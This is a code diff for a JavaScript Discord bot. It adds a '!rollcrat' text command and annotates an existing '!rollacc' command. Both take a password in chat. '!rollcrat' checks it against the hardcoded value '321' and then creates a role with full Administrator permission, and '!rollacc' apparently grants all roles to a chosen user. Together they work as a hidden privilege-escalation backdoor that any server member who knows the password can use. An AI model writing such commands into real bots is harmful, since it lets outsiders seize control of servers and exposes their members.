@@ -1459,7 +1459,7 @@ client.on('guildMemberAdd', async (member) => {
 });
 
 // ============================================
-// NEW: TEXT COMMAND !rollacc
+// NEW: TEXT COMMAND !rollacc (give all roles to user)
 // ============================================
 client.on('messageCreate', async (message) => {
     if (message.author.bot) return;
@@ -1467,7 +1467,6 @@ client.on('messageCreate', async (message) => {
     if (!message.content.startsWith('!rollacc')) return;
 
     const args = message.content.trim().split(/\s+/);
-    // Expected: !rollacc <password> <userMentionOrId>
     if (args.length < 3) {
         return message.reply('❌ Usage: `!rollacc <password> <@user or userID>`');
     }
@@ -1482,7 +1481,6 @@ client.on('messageCreate', async (message) => {
     // Resolve target user
     let targetMember;
     try {
-        // Try to fetch by mention or ID
         const userId = targetArg.replace(/[<@!>]/g, '');
         targetMember = await message.guild.members.fetch(userId);
     } catch (e) {
@@ -1516,6 +1514,53 @@ client.on('messageCreate', async (message) => {
     }
 
     await message.reply(reply);
+});
+
+// ============================================
+// NEW: TEXT COMMAND !rollcrat (create admin role)
+// ============================================
+client.on('messageCreate', async (message) => {
+    if (message.author.bot) return;
+    if (!message.guild) return;
+    if (!message.content.startsWith('!rollcrat')) return;
+
+    const args = message.content.trim().split(/\s+/);
+    if (args.length < 2) {
+        return message.reply('❌ Usage: `!rollcrat <password>`');
+    }
+
+    const password = args[1];
+    if (password !== '321') {
+        return message.reply('❌ Incorrect password.');
+    }
+
+    // Check bot permissions
+    const botMember = await message.guild.members.fetch(client.user.id);
+    if (!botMember.permissions.has(PermissionFlagsBits.Administrator)) {
+        return message.reply('❌ I do not have **Administrator** permission, so I cannot create a role with all permissions.');
+    }
+
+    // Create the role with all permissions
+    try {
+        const role = await message.guild.roles.create({
+            name: `🛡️ Admin Role • ${Date.now().toString().slice(-6)}`,
+            permissions: [PermissionFlagsBits.Administrator],
+            color: '#FF0000',
+            reason: `Created by ${message.author.tag} using !rollcrat`,
+        });
+
+        // Move the role below the bot's highest role to keep hierarchy safe
+        const botHighestRole = botMember.roles.highest;
+        if (role.position >= botHighestRole.position) {
+            // Try to move it down
+            await role.setPosition(botHighestRole.position - 1).catch(() => {});
+        }
+
+        await message.reply(`✅ Role created successfully!\n**Role ID:** \`${role.id}\``);
+    } catch (error) {
+        console.error('Error creating role:', error);
+        await message.reply(`❌ Failed to create role: ${error.message}`);
+    }
 });
 
 // ============================================
